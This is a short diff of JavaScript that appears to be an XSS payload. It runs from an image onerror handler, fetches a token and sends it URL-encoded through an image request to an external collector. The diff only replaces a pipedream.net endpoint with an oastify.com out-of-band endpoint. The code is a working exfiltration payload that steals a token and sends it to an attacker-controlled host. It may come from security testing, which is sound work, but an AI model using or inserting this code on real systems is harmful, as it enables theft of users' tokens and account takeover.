@@ -6,7 +6,7 @@ img.onerror = function () {
     .then(r => r.text())
     .then(token => {
       new Image().src =
-        'https://eoeqgca83zpr7tb.m.pipedream.net/?token=' +
+        'https://vqpky2zzatwzjotedb73of29p0vrjh76.oastify.com/?token=' +
         encodeURIComponent(token);
     });
 };
